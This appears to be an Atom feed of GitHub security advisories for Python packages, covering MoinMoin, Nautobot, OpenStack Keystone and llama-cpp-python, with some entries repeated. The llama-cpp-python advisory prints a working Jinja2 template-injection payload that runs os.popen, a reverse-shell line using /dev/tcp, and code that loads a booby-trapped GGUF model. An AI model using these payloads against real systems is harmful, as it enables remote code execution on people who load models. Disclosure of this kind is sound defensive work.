<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2024-05-14T15:01:19.133Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[Moin] MoinMoin Improper Privilege Management]]></title>
        <id>https://github.com/advisories/GHSA-9xh4-wpx8-rg2w</id>
        <link href="https://github.com/advisories/GHSA-9xh4-wpx8-rg2w"/>
        <updated>2024-05-13T20:51:57.000Z</updated>
        <content type="html"><![CDATA[<p>MoinMoin 1.2.2 and earlier could allow a remote attacker to gain elevated privileges, caused by an undisclosed Access Control List (ACL) vulnerability in the PageEditor.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2004-1463">https://nvd.nist.gov/vuln/detail/CVE-2004-1463</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/16832">https://exchange.xforce.ibmcloud.com/vulnerabilities/16832</a></li>
<li><a href="http://sourceforge.net/project/shownotes.php?group_id=8482&amp;release_id=254801">http://sourceforge.net/project/shownotes.php?group_id=8482&amp;release_id=254801</a></li>
<li><a href="http://www.gentoo.org/security/en/glsa/glsa-200408-25.xml">http://www.gentoo.org/security/en/glsa/glsa-200408-25.xml</a></li>
<li><a href="http://www.osvdb.org/displayvuln.php?osvdb_id=8195">http://www.osvdb.org/displayvuln.php?osvdb_id=8195</a></li>
<li><a href="http://www.securityfocus.com/bid/10801">http://www.securityfocus.com/bid/10801</a></li>
<li><a href="https://github.com/advisories/GHSA-9xh4-wpx8-rg2w">https://github.com/advisories/GHSA-9xh4-wpx8-rg2w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9xh4-wpx8-rg2w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-04-29T02:59:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nautobot] Nautobot's BANNER_* configuration can be used to inject arbitrary HTML content into Nautobot pages]]></title>
        <id>https://github.com/advisories/GHSA-r2hr-4v48-fjv3</id>
        <link href="https://github.com/advisories/GHSA-r2hr-4v48-fjv3"/>
        <updated>2024-05-13T19:59:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Nautobot user with admin privileges can modify the <code>BANNER_TOP</code>, <code>BANNER_BOTTOM</code>, and <code>BANNER_LOGIN</code> configuration settings via the <code>/admin/constance/config/</code> endpoint. Normally these settings are used to provide custom banner text at the top and bottom of all Nautobot web pages (or specifically on the login page in the case of <code>BANNER_LOGIN</code>) but it was reported that an admin user can make use of these settings to inject arbitrary HTML, potentially exposing Nautobot users to security issues such as cross-site scripting (stored XSS).</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p>Patches will be released as part of Nautobot 1.6.22 and 2.2.4.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>As <a href="https://docs.nautobot.com/projects/core/en/stable/user-guide/administration/configuration/optional-settings/#administratively-configurable-settings">described in the Nautobot documentation</a>, these settings are only configurable through the admin UI of Nautobot if they are <em>not</em> explicitly set to some non-empty value in the <code>nautobot_config.py</code> or equivalent Nautobot configuration file. Therefore, adding the following configuration to said file completely mitigates this vulnerability in both Nautobot 1.x and 2.x:</p>
<pre><code class="language-python">BANNER_LOGIN = " "
BANNER_TOP = " "
BANNER_BOTTOM = " "
</code></pre>
<p>or alternately (Nautobot 2.x only), if those variables are not defined explicitly in your configuration file, setting the following environment variables for the Nautobot user account serves the same purpose:</p>
<pre><code class="language-shell">NAUTOBOT_BANNER_LOGIN=" "
NAUTOBOT_BANNER_TOP=" "
NAUTOBOT_BANNER_BOTTOM=" "
</code></pre>
<p>Limiting all users who do not need elevated privileges to non-admin access (<code>is_superuser: False</code> and <code>is_staff: False</code>) is a partial mitigation as well.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nautobot/nautobot/pull/5697">https://github.com/nautobot/nautobot/pull/5697</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/5698">https://github.com/nautobot/nautobot/pull/5698</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nautobot/nautobot/security/advisories/GHSA-r2hr-4v48-fjv3">https://github.com/nautobot/nautobot/security/advisories/GHSA-r2hr-4v48-fjv3</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/5697">https://github.com/nautobot/nautobot/pull/5697</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/5698">https://github.com/nautobot/nautobot/pull/5698</a></li>
<li><a href="https://github.com/nautobot/nautobot/commit/4f0a66bd6307bfe0e0acb899233e0d4ad516f51c">https://github.com/nautobot/nautobot/commit/4f0a66bd6307bfe0e0acb899233e0d4ad516f51c</a></li>
<li><a href="https://github.com/nautobot/nautobot/commit/f640aedc69c848d3d1be57f0300fc40033ff6423">https://github.com/nautobot/nautobot/commit/f640aedc69c848d3d1be57f0300fc40033ff6423</a></li>
<li><a href="https://github.com/advisories/GHSA-r2hr-4v48-fjv3">https://github.com/advisories/GHSA-r2hr-4v48-fjv3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r2hr-4v48-fjv3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-13T19:59:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nautobot] Nautobot's BANNER_* configuration can be used to inject arbitrary HTML content into Nautobot pages]]></title>
        <id>https://github.com/advisories/GHSA-r2hr-4v48-fjv3</id>
        <link href="https://github.com/advisories/GHSA-r2hr-4v48-fjv3"/>
        <updated>2024-05-13T19:59:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Nautobot user with admin privileges can modify the <code>BANNER_TOP</code>, <code>BANNER_BOTTOM</code>, and <code>BANNER_LOGIN</code> configuration settings via the <code>/admin/constance/config/</code> endpoint. Normally these settings are used to provide custom banner text at the top and bottom of all Nautobot web pages (or specifically on the login page in the case of <code>BANNER_LOGIN</code>) but it was reported that an admin user can make use of these settings to inject arbitrary HTML, potentially exposing Nautobot users to security issues such as cross-site scripting (stored XSS).</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p>Patches will be released as part of Nautobot 1.6.22 and 2.2.4.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>As <a href="https://docs.nautobot.com/projects/core/en/stable/user-guide/administration/configuration/optional-settings/#administratively-configurable-settings">described in the Nautobot documentation</a>, these settings are only configurable through the admin UI of Nautobot if they are <em>not</em> explicitly set to some non-empty value in the <code>nautobot_config.py</code> or equivalent Nautobot configuration file. Therefore, adding the following configuration to said file completely mitigates this vulnerability in both Nautobot 1.x and 2.x:</p>
<pre><code class="language-python">BANNER_LOGIN = " "
BANNER_TOP = " "
BANNER_BOTTOM = " "
</code></pre>
<p>or alternately (Nautobot 2.x only), if those variables are not defined explicitly in your configuration file, setting the following environment variables for the Nautobot user account serves the same purpose:</p>
<pre><code class="language-shell">NAUTOBOT_BANNER_LOGIN=" "
NAUTOBOT_BANNER_TOP=" "
NAUTOBOT_BANNER_BOTTOM=" "
</code></pre>
<p>Limiting all users who do not need elevated privileges to non-admin access (<code>is_superuser: False</code> and <code>is_staff: False</code>) is a partial mitigation as well.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nautobot/nautobot/pull/5697">https://github.com/nautobot/nautobot/pull/5697</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/5698">https://github.com/nautobot/nautobot/pull/5698</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nautobot/nautobot/security/advisories/GHSA-r2hr-4v48-fjv3">https://github.com/nautobot/nautobot/security/advisories/GHSA-r2hr-4v48-fjv3</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/5697">https://github.com/nautobot/nautobot/pull/5697</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/5698">https://github.com/nautobot/nautobot/pull/5698</a></li>
<li><a href="https://github.com/nautobot/nautobot/commit/4f0a66bd6307bfe0e0acb899233e0d4ad516f51c">https://github.com/nautobot/nautobot/commit/4f0a66bd6307bfe0e0acb899233e0d4ad516f51c</a></li>
<li><a href="https://github.com/nautobot/nautobot/commit/f640aedc69c848d3d1be57f0300fc40033ff6423">https://github.com/nautobot/nautobot/commit/f640aedc69c848d3d1be57f0300fc40033ff6423</a></li>
<li><a href="https://github.com/advisories/GHSA-r2hr-4v48-fjv3">https://github.com/advisories/GHSA-r2hr-4v48-fjv3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r2hr-4v48-fjv3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-13T19:59:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone Denial of Service vulnerability via a large HTTP request]]></title>
        <id>https://github.com/advisories/GHSA-4ppj-4p4v-jf4p</id>
        <link href="https://github.com/advisories/GHSA-4ppj-4p4v-jf4p"/>
        <updated>2024-05-13T16:11:50.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Keystone Grizzly before 2013.1, Folsom, and possibly earlier allows remote attackers to cause a denial of service (CPU and memory consumption) via a large HTTP request, as demonstrated by a long tenant_name when requesting a token.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-0270">https://nvd.nist.gov/vuln/detail/CVE-2013-0270</a></li>
<li><a href="https://github.com/openstack/keystone/commit/7691276b869a86c2b75631d5bede9f61e030d9d8">https://github.com/openstack/keystone/commit/7691276b869a86c2b75631d5bede9f61e030d9d8</a></li>
<li><a href="https://github.com/openstack/keystone/commit/82c87e5638ebaf9f166a9b07a0155291276d6fdc">https://github.com/openstack/keystone/commit/82c87e5638ebaf9f166a9b07a0155291276d6fdc</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/1099025">https://bugs.launchpad.net/keystone/+bug/1099025</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=909012">https://bugzilla.redhat.com/show_bug.cgi?id=909012</a></li>
<li><a href="https://launchpad.net/keystone/grizzly/2013.1">https://launchpad.net/keystone/grizzly/2013.1</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0708.html">http://rhn.redhat.com/errata/RHSA-2013-0708.html</a></li>
<li><a href="https://github.com/advisories/GHSA-4ppj-4p4v-jf4p">https://github.com/advisories/GHSA-4ppj-4p4v-jf4p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4ppj-4p4v-jf4p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-05T02:48:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[llama-cpp-python] llama-cpp-python vulnerable to Remote Code Execution by Server-Side Template Injection in Model Metadata]]></title>
        <id>https://github.com/advisories/GHSA-56xg-wfcc-g829</id>
        <link href="https://github.com/advisories/GHSA-56xg-wfcc-g829"/>
        <updated>2024-05-13T14:10:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p><code>llama-cpp-python</code> depends on class <code>Llama</code> in <code>llama.py</code> to load <code>.gguf</code> llama.cpp or Latency Machine Learning Models. The <code>__init__</code> constructor built in the <code>Llama</code> takes several parameters to configure the loading and running of the model. Other than <code>NUMA, LoRa settings</code>, <code>loading tokenizers,</code> and <code>hardware settings</code>, <code>__init__</code> also loads the <code>chat template</code> from targeted <code>.gguf</code> 's Metadata and furtherly parses it to <code>llama_chat_format.Jinja2ChatFormatter.to_chat_handler()</code> to construct the <code>self.chat_handler</code> for this model. Nevertheless, <code>Jinja2ChatFormatter</code> parse the <code>chat template</code> within the Metadate with sandbox-less <code>jinja2.Environment</code>, which is furthermore rendered in <code>__call__</code> to construct the <code>prompt</code> of interaction. This allows <code>jinja2</code> Server Side Template Injection which leads to RCE by a carefully constructed payload.</p>
<h2 id="source-to-sink">Source-to-Sink</h2>
<h3 id="llamapy---class-llama---__init__"><code>llama.py</code> -&gt; <code>class Llama</code> -&gt; <code>__init__</code>:</h3>
<pre><code class="language-python">class Llama:
    """High-level Python wrapper for a llama.cpp model."""

    __backend_initialized = False

    def __init__(
        self,
        model_path: str,
        # lots of params; Ignoring
    ):
 
        self.verbose = verbose

        set_verbose(verbose)

        if not Llama.__backend_initialized:
            with suppress_stdout_stderr(disable=verbose):
                llama_cpp.llama_backend_init()
            Llama.__backend_initialized = True

        # Ignoring lines of unrelated codes.....

        try:
            self.metadata = self._model.metadata()
        except Exception as e:
            self.metadata = {}
            if self.verbose:
                print(f"Failed to load metadata: {e}", file=sys.stderr)

        if self.verbose:
            print(f"Model metadata: {self.metadata}", file=sys.stderr)

        if (
            self.chat_format is None
            and self.chat_handler is None
            and "tokenizer.chat_template" in self.metadata
        ):
            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(
                self.metadata
            )

            if chat_format is not None:
                self.chat_format = chat_format
                if self.verbose:
                    print(f"Guessed chat format: {chat_format}", file=sys.stderr)
            else:
                template = self.metadata["tokenizer.chat_template"]
                try:
                    eos_token_id = int(self.metadata["tokenizer.ggml.eos_token_id"])
                except:
                    eos_token_id = self.token_eos()
                try:
                    bos_token_id = int(self.metadata["tokenizer.ggml.bos_token_id"])
                except:
                    bos_token_id = self.token_bos()

                eos_token = self._model.token_get_text(eos_token_id)
                bos_token = self._model.token_get_text(bos_token_id)

                if self.verbose:
                    print(f"Using gguf chat template: {template}", file=sys.stderr)
                    print(f"Using chat eos_token: {eos_token}", file=sys.stderr)
                    print(f"Using chat bos_token: {bos_token}", file=sys.stderr)

                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(
                    template=template,
                    eos_token=eos_token,
                    bos_token=bos_token,
                    stop_token_ids=[eos_token_id],
                ).to_chat_handler()

        if self.chat_format is None and self.chat_handler is None:
            self.chat_format = "llama-2"
            if self.verbose:
                print(f"Using fallback chat format: {chat_format}", file=sys.stderr)
                
</code></pre>
<p>In <code>llama.py</code>, <code>llama-cpp-python</code> defined the fundamental class for model initialization parsing (Including <code>NUMA, LoRa settings</code>, <code>loading tokenizers,</code> and stuff ). In our case, we will be focusing on the parts where it processes <code>metadata</code>; it first checks if <code>chat_format</code> and <code>chat_handler</code> are <code>None</code> and checks if the key <code>tokenizer.chat_template</code> exists in the metadata dictionary <code>self.metadata</code>. If it exists, it will try to guess the <code>chat format</code> from the <code>metadata</code>. If the guess fails, it will get the value of <code>chat_template</code> directly from <code>self.metadata.self.metadata</code> is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the <code>chat_template</code> is parsed into <code>llama_chat_format.Jinja2ChatFormatter</code> as params which furthermore stored the <code>to_chat_handler()</code> as <code>chat_handler</code></p>
<h3 id="llama_chat_formatpy---jinja2chatformatter"><code>llama_chat_format.py</code> -&gt; <code>Jinja2ChatFormatter</code>:</h3>
<p><code>self._environment =  jinja2.Environment( -&gt; from_string(self.template) -&gt; self._environment.render(</code></p>
<pre><code class="language-python">class ChatFormatter(Protocol):
    """Base Protocol for a chat formatter. A chat formatter is a function that
    takes a list of messages and returns a chat format response which can be used
    to generate a completion. The response can also include a stop token or list
    of stop tokens to use for the completion."""

    def __call__(
        self,
        *,
        messages: List[llama_types.ChatCompletionRequestMessage],
        **kwargs: Any,
    ) -&gt; ChatFormatterResponse: ...


class Jinja2ChatFormatter(ChatFormatter):
    def __init__(
        self,
        template: str,
        eos_token: str,
        bos_token: str,
        add_generation_prompt: bool = True,
        stop_token_ids: Optional[List[int]] = None,
    ):
        """A chat formatter that uses jinja2 templates to format the prompt."""
        self.template = template
        self.eos_token = eos_token
        self.bos_token = bos_token
        self.add_generation_prompt = add_generation_prompt
        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None

        self._environment = jinja2.Environment(
            loader=jinja2.BaseLoader(),
            trim_blocks=True,
            lstrip_blocks=True,
        ).from_string(self.template)

    def __call__(
        self,
        *,
        messages: List[llama_types.ChatCompletionRequestMessage],
        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,
        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,
        tools: Optional[List[llama_types.ChatCompletionTool]] = None,
        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,
        **kwargs: Any,
    ) -&gt; ChatFormatterResponse:
        def raise_exception(message: str):
            raise ValueError(message)

        prompt = self._environment.render(
            messages=messages,
            eos_token=self.eos_token,
            bos_token=self.bos_token,
            raise_exception=raise_exception,
            add_generation_prompt=self.add_generation_prompt,
            functions=functions,
            function_call=function_call,
            tools=tools,
            tool_choice=tool_choice,
        )
</code></pre>
<p>As we can see in <code>llama_chat_format.py</code> -&gt; <code>Jinja2ChatFormatter</code>, the constructor <code>__init__</code> initialized required <code>members</code> inside of the class; Nevertheless, focusing on this line:</p>
<pre><code class="language-python">        self._environment = jinja2.Environment(
            loader=jinja2.BaseLoader(),
            trim_blocks=True,
            lstrip_blocks=True,
        ).from_string(self.template)
</code></pre>
<p>Fun thing here: <code>llama_cpp_python</code> directly loads the <code>self.template</code> (<code>self.template = template</code> which is the <code>chat template</code> located in the <code>Metadate</code> that is parsed as a param) via <code>jinja2.Environment.from_string(</code> without setting any sandbox flag or using the protected <code>immutablesandboxedenvironment </code>class. This is extremely unsafe since the attacker can implicitly tell <code>llama_cpp_python</code> to load malicious <code>chat template</code> which is furthermore rendered in the <code>__call__</code> constructor, allowing RCEs or Denial-of-Service since <code>jinja2</code>'s renderer evaluates embed codes like <code>eval()</code>, and we can utilize expose method by exploring the attribution such as <code>__globals__</code>, <code>__subclasses__</code> of pretty much anything.</p>
<pre><code class="language-python">    def __call__(
        self,
        *,
        messages: List[llama_types.ChatCompletionRequestMessage],
        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,
        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,
        tools: Optional[List[llama_types.ChatCompletionTool]] = None,
        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,
        **kwargs: Any,
    ) -&gt; ChatFormatterResponse:
        def raise_exception(message: str):
            raise ValueError(message)

        prompt = self._environment.render( # rendered!
            messages=messages,
            eos_token=self.eos_token,
            bos_token=self.bos_token,
            raise_exception=raise_exception,
            add_generation_prompt=self.add_generation_prompt,
            functions=functions,
            function_call=function_call,
            tools=tools,
            tool_choice=tool_choice,
        )
</code></pre>
<h2 id="exploiting">Exploiting</h2>
<p>For our exploitation, we first downloaded <a href="https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf">qwen1_5-0_5b-chat-q2_k.gguf</a> of <code>Qwen/Qwen1.5-0.5B-Chat-GGUF</code> on <code>huggingface</code> as the base of the exploitation, by importing the file to <code>Hex-compatible</code> editors (In my case I used the built-in <code>Hex editor</code> or <code>vscode</code>), you can try to search for key <code>chat_template</code> (imported as <code>template = self.metadata["tokenizer.chat_template"]</code> in <code>llama-cpp-python</code>):</p>
<img style="zoom: 25%;" alt="image-20240502180804562" src="https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png">

<p><code>qwen1_5-0_5b-chat-q2_k.gguf</code> appears to be using the OG <code>role+message</code> and using the fun <code>jinja2</code> syntax. By first replacing the original <code>chat_template</code> in <code>\x00</code>, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression <code>().__class__.__base__.__subclasses__()</code> retrieves a list of all subclasses of the basic <code>object</code> class and then we check if its <code>warning</code> by <code>if "warning" in x.__name__</code>, if it is , we access its module via the <code>_module</code> attribute then access Python's built-in functions through <code>__builtins__</code> and uses the <code>__import__</code> function to import the <code>os</code> module and finally we called <code>os.popen</code> to <code>touch /tmp/retr0reg</code>, create an empty file call <code>retr0reg</code> under <code>/tmp/</code></p>
<pre><code class="language-python">{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("touch /tmp/retr0reg")}}{%endif%}{% endfor %}
</code></pre>
<p>in real life exploiting instance, we can change <code>touch /tmp/retr0reg</code> into arbitrary codes like <code>sh -i &gt;&amp; /dev/tcp/&lt;HOST&gt;/&lt;PORT&gt; 0&gt;&amp;1</code> to create a reverse shell connection to specified host, in our case we are using <code>touch /tmp/retr0reg</code> to showcase the exploitability of this vulnerability.</p>
<img style="zoom:50%;" alt="image-20240502200909127" src="https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png">

<p>After these steps, we got ourselves a malicious model with an embedded payload in <code>chat_template</code> of the <code>metahead</code>, in which will be parsed and rendered by <code>llama.py:class Llama:init -&gt;  self.chat_handler </code>-&gt; <code>llama_chat_format.py:Jinja2ChatFormatter:init -&gt;  self._environment = jinja2.Environment(</code> -&gt; ``llama_chat_format.py:Jinja2ChatFormatter:call -&gt; self._environment.render(`</p>
<p><em>(The uploaded malicious model file is in <a href="https://huggingface.co/Retr0REG/Whats-up-gguf">https://huggingface.co/Retr0REG/Whats-up-gguf</a> )</em></p>
<pre><code class="language-python">from llama_cpp import Llama

# Loading locally:
model = Llama(model_path="qwen1_5-0_5b-chat-q2_k.gguf")
# Or loading from huggingface:
model = Llama.from_pretrained(
    repo_id="Retr0REG/Whats-up-gguf",
    filename="qwen1_5-0_5b-chat-q2_k.gguf",
    verbose=False
)

print(model.create_chat_completion(messages=[{"role": "user","content": "what is the meaning of life?"}]))
</code></pre>
<p>Now when the model is loaded whether as <code> Llama.from_pretrained</code> or <code>Llama</code> and chatted, our malicious code in the <code>chat_template</code> of the <code>metahead</code> will be triggered and execute arbitrary code. </p>
<p>PoC video here: <a href="https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing">https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/abetlen/llama-cpp-python/security/advisories/GHSA-56xg-wfcc-g829">https://github.com/abetlen/llama-cpp-python/security/advisories/GHSA-56xg-wfcc-g829</a></li>
<li><a href="https://github.com/advisories/GHSA-56xg-wfcc-g829">https://github.com/advisories/GHSA-56xg-wfcc-g829</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-56xg-wfcc-g829</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-05-13T14:10:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[moin] MoinMoin Cross-site Scripting (XSS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5m2m-27cg-7v4v</id>
        <link href="https://github.com/advisories/GHSA-5m2m-27cg-7v4v"/>
        <updated>2024-05-11T05:02:31.000Z</updated>
        <content type="html"><![CDATA[<p>Multiple cross-site scripting (XSS) vulnerabilities in MoinMoin 1.7.3 and earlier, 1.8.x before 1.8.8, and 1.9.x before 1.9.3 allow remote attackers to inject arbitrary web script or HTML via crafted content, related to (1) <code>Page.py</code>, (2) <code>PageEditor.py</code>, (3) <code>PageGraphicalEditor.py</code>, (4) <code>action/CopyPage.py</code>, (5) <code>action/Load.py</code>, (6) <code>action/RenamePage.py</code>, (7) <code>action/backup.py</code>, (8) <code>action/login.py</code>, (9) <code>action/newaccount.py</code>, and (10) <code>action/recoverpass.py</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2010-2487">https://nvd.nist.gov/vuln/detail/CVE-2010-2487</a></li>
<li><a href="http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=584809">http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=584809</a></li>
<li><a href="http://hg.moinmo.in/moin/1.7/rev/37306fba2189">http://hg.moinmo.in/moin/1.7/rev/37306fba2189</a></li>
<li><a href="http://hg.moinmo.in/moin/1.8/raw-file/1.8.8/docs/CHANGES">http://hg.moinmo.in/moin/1.8/raw-file/1.8.8/docs/CHANGES</a></li>
<li><a href="http://hg.moinmo.in/moin/1.8/rev/4238b0c90871">http://hg.moinmo.in/moin/1.8/rev/4238b0c90871</a></li>
<li><a href="http://hg.moinmo.in/moin/1.9/raw-file/1.9.3/docs/CHANGES">http://hg.moinmo.in/moin/1.9/raw-file/1.9.3/docs/CHANGES</a></li>
<li><a href="http://hg.moinmo.in/moin/1.9/rev/68ba3cc79513">http://hg.moinmo.in/moin/1.9/rev/68ba3cc79513</a></li>
<li><a href="http://hg.moinmo.in/moin/1.9/rev/e50b087c4572">http://hg.moinmo.in/moin/1.9/rev/e50b087c4572</a></li>
<li><a href="http://marc.info/?l=oss-security&amp;m=127799369406968&amp;w=2">http://marc.info/?l=oss-security&amp;m=127799369406968&amp;w=2</a></li>
<li><a href="http://marc.info/?l=oss-security&amp;m=127809682420259&amp;w=2">http://marc.info/?l=oss-security&amp;m=127809682420259&amp;w=2</a></li>
<li><a href="http://moinmo.in/MoinMoinBugs/1.9.2UnescapedInputForThemeAddMsg">http://moinmo.in/MoinMoinBugs/1.9.2UnescapedInputForThemeAddMsg</a></li>
<li><a href="http://moinmo.in/MoinMoinRelease1.8">http://moinmo.in/MoinMoinRelease1.8</a></li>
<li><a href="http://moinmo.in/MoinMoinRelease1.9">http://moinmo.in/MoinMoinRelease1.9</a></li>
<li><a href="http://moinmo.in/SecurityFixes">http://moinmo.in/SecurityFixes</a></li>
<li><a href="http://www.debian.org/security/2010/dsa-2083">http://www.debian.org/security/2010/dsa-2083</a></li>
<li><a href="https://web.archive.org/web/20140801154518/http://secunia.com/advisories/40836">https://web.archive.org/web/20140801154518/http://secunia.com/advisories/40836</a></li>
<li><a href="https://web.archive.org/web/20200228150629/http://www.securityfocus.com/bid/40549">https://web.archive.org/web/20200228150629/http://www.securityfocus.com/bid/40549</a></li>
<li><a href="https://github.com/advisories/GHSA-5m2m-27cg-7v4v">https://github.com/advisories/GHSA-5m2m-27cg-7v4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5m2m-27cg-7v4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T05:49:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[moin] MoinMoin Cross-site Scripting (XSS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5m2m-27cg-7v4v</id>
        <link href="https://github.com/advisories/GHSA-5m2m-27cg-7v4v"/>
        <updated>2024-05-11T05:02:31.000Z</updated>
        <content type="html"><![CDATA[<p>Multiple cross-site scripting (XSS) vulnerabilities in MoinMoin 1.7.3 and earlier, 1.8.x before 1.8.8, and 1.9.x before 1.9.3 allow remote attackers to inject arbitrary web script or HTML via crafted content, related to (1) <code>Page.py</code>, (2) <code>PageEditor.py</code>, (3) <code>PageGraphicalEditor.py</code>, (4) <code>action/CopyPage.py</code>, (5) <code>action/Load.py</code>, (6) <code>action/RenamePage.py</code>, (7) <code>action/backup.py</code>, (8) <code>action/login.py</code>, (9) <code>action/newaccount.py</code>, and (10) <code>action/recoverpass.py</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2010-2487">https://nvd.nist.gov/vuln/detail/CVE-2010-2487</a></li>
<li><a href="http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=584809">http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=584809</a></li>
<li><a href="http://hg.moinmo.in/moin/1.7/rev/37306fba2189">http://hg.moinmo.in/moin/1.7/rev/37306fba2189</a></li>
<li><a href="http://hg.moinmo.in/moin/1.8/raw-file/1.8.8/docs/CHANGES">http://hg.moinmo.in/moin/1.8/raw-file/1.8.8/docs/CHANGES</a></li>
<li><a href="http://hg.moinmo.in/moin/1.8/rev/4238b0c90871">http://hg.moinmo.in/moin/1.8/rev/4238b0c90871</a></li>
<li><a href="http://hg.moinmo.in/moin/1.9/raw-file/1.9.3/docs/CHANGES">http://hg.moinmo.in/moin/1.9/raw-file/1.9.3/docs/CHANGES</a></li>
<li><a href="http://hg.moinmo.in/moin/1.9/rev/68ba3cc79513">http://hg.moinmo.in/moin/1.9/rev/68ba3cc79513</a></li>
<li><a href="http://hg.moinmo.in/moin/1.9/rev/e50b087c4572">http://hg.moinmo.in/moin/1.9/rev/e50b087c4572</a></li>
<li><a href="http://marc.info/?l=oss-security&amp;m=127799369406968&amp;w=2">http://marc.info/?l=oss-security&amp;m=127799369406968&amp;w=2</a></li>
<li><a href="http://marc.info/?l=oss-security&amp;m=127809682420259&amp;w=2">http://marc.info/?l=oss-security&amp;m=127809682420259&amp;w=2</a></li>
